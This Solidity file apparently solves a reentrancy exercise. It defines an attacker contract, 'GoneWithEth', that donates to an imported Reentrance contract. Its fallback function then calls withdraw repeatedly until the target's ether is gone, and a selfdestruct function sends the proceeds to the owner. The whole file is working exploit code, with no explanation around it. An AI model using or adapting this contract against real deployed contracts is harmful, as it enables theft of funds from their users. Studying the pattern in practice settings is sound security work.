pragma solidity ^0.5.11;

import "./ex30_Reentrancy.sol";

contract GoneWithEth {

    address payable public owner;
    Reentrance public reentrance;

    constructor(address _addr) public payable {
        owner = msg.sender;
        reentrance = Reentrance(_addr);
    }

    modifier onlyOwner {
        require (msg.sender == owner, "Only owner can call this function.");
        _;
    }

    function donate() external onlyOwner {
        reentrance.donate.value(0.5 ether)(address(this));
    }

    function() external payable {
        if (address(reentrance).balance > 0 ) {
            reentrance.withdraw(0.5 ether);
        }
    }

    function kill() external onlyOwner {
        selfdestruct(owner);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
